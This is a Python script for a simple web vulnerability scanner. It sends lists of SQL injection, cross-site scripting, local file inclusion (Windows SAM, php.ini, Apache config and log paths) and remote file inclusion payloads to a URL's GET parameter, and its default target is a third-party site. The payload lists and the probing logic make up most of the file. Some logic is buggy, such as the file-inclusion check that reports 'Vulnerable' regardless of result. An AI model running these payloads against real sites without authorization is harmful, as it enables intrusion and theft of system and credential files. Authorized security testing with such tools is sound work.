#!python3
import argparse, urllib.request, os, sys

sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
xss = ["'<SCRIPT>alert(0)</SCRIPT>#",
       "'<SCRIPT>alert(0)</SCRIPT>//",
        "';alert(String.fromCharCode(88,83,83))//",
       "\";alert(String.fromCharCode(88,83,83))//",
       "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
       "'';!--\"<XSS>=&{()}",
       "<IMG SRC=\"javascript:alert('XSS');\">",
       "<IMG SRC=javascript:alert('XSS')>",
       "<IMG SRC=JaVaScRiPt:alert('XSS')>",
       "<IMG SRC=`javascript:alert(\"Test, 'XSS'\")`>",
       "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
       "<a onmouseover=alert(document.cookie)>xxs link</a>",
       "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
       "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"]
lfi = ["C:\\boot.ini",
        "C:\\WINDOWS\\win.ini",
        "C:\\WINNT\\win.ini",
        "C:\\WINDOWS\\Repair\SAM",
        "C:\\WINDOWS\\php.ini",
        "C:\\WINNT\\php.ini",
        "C:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf",
        "C:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf",
        "C:\\Program Files\\xampp\\apache\\conf\\httpd.conf",
        "C:\\php\\php.ini",
        "C:\\php5\\php.ini",
        "C:\\php4\\php.ini",
        "C:\\apache\\php\\php.ini",
        "C:\\xampp\\apache\\bin\\php.ini",
        "C:\\home2\\bin\\stable\\apache\\php.ini",
        "C:\\home\\bin\\stable\\apache\\php.ini",
        "C:\\Program Files\\Apache Group\\Apache\\logs\\access.log",
        "C:\\Program Files\\Apache Group\\Apache\\logs\\error.log",
        "C:\\WINDOWS\\TEMP\\",
        "C\\php\\sessions\\",
        "C:\\php5\\sessions\\",
        "C:\\php4\\sessions\\"]
rfi = ["http://www.snailbook.com/docs/publickey-file.txt"]
rce = []

def clearScreen():                                                          # Clears the screen and re-prints the logo
    if sys.platform == 'win32':os.system('cls')
    else:os.system('clear')
    print('''
                         __        __   	 ____       ____
       ____  ____  _____/ /___  __/ /__ 	 )   \     /   (
      / __ \/ __ \/ ___/ __/ / / / / _ \	  )_  \_V_/  _(
     / / / / /_/ / /__/ /_/ /_/ / /  __/	    )__   __(   
    /_/ /_/\____/\___/\__/\__,_/_/\___/	               `-'
    ''')

def get():                                                                  # Function for the -m get parameter
    x = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
    if x=="1":
        for i in sqli:
            print("Testing: " + i)
            req = args.url + i
            try:
                with urllib.request.urlopen(req) as response:
                    html = str(response.read())
                with open("sql_errors.txt", "r") as f:
                    for line in f.readlines():
                        line = line.rstrip('\n')
                        if line in html:
                            print("Likely vulnerable.\n")
                            break
            except Exception as e:
                print(e)

    elif x=="2":
        for i in xss:
            req = args.url + i
            try:
                with urllib.request.urlopen(req) as response:
                   html = str(response.read())
                if i in html:
                    print("\nLikely vulnerable.")
                    break
            except Exception as e:
                print(e)

    elif x=="3":
        n = args.url.find('=') + 1
        overall = False
        for i in lfi:
            req = args.url[:n] + i
            try:
                print("Trying: " + i)
                with urllib.request.urlopen(req) as response:
                   html = str(response.read())
                vuln = False
                with open("lfi_404.txt", "r") as f:
                    for line in f.readlines():
                        line = line.rstrip('\n')
                        if line in html:
                            print("Not found.\n")
                            break
                        vuln = True
                if vuln:
                    print("File detected.\n")
                    overall = True
            except Exception as e:
                print(str(e) + "\n")
        print("\n\nOverall: Vulnerable")
    elif x=="4":
        n = args.url.find('=') + 1
        for i in rfi:
            print("Trying: " + i)
            req = args.url[:n] + i
            try:
                with urllib.request.urlopen(req) as response:
                   html = str(response.read())
                with urllib.request.urlopen(i) as response:
                    file = str(response.read())
                if file in html:print("Likely vulnerable.\n")
            except Exception as e:
                print(str(e) + "\n")
    elif x=="5":atk = rce

def post():                                                                 # Function for the -m post parameter (unfinished)
    print("POST functionality not yet developed.")

def cookie():                                                               # Function for the -m cookie parameter (unfinished)
    print("COOKIE functionality not yet developed.")

parser = argparse.ArgumentParser()                                          # Begin agument setup

parser.add_argument('-m', '--method', dest='method', help='get, post, or cookie', default='get')
parser.add_argument('-u', '--url', dest='url', help='url to target', default='http://www.kapaver.com/product-details.php?product_id=1')
parser.add_argument('-p', '--parameter', dest='parameter', help='parameter to use')
parser.add_argument('-d', '--data', dest='data', help='data to use for post or cookie module', default=None)

args = parser.parse_args()                                                  # End argument setup

clearScreen()
                                                                            # Begin the "main" function
if sys.platform == 'win32':os.system('color a')
else:os.system('csetterm -foreground green -store')

if args.method.lower() == 'get':get()
elif args.method.lower() == 'post':post()
elif args.method.lower() == 'cookie':cookie()
